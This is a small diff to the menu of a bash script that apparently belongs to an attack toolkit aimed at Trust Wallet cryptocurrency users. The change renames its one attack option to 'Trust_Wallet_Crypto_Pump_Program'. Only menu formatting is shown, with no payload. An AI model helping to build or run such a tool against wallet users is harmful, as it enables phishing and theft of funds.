@@ -331,7 +331,7 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Trust Wallet Users ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Trust_Wallet
+		${RED}[${WHITE}01${RED}]${ORANGE} Trust_Wallet_Crypto_Pump_Program
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
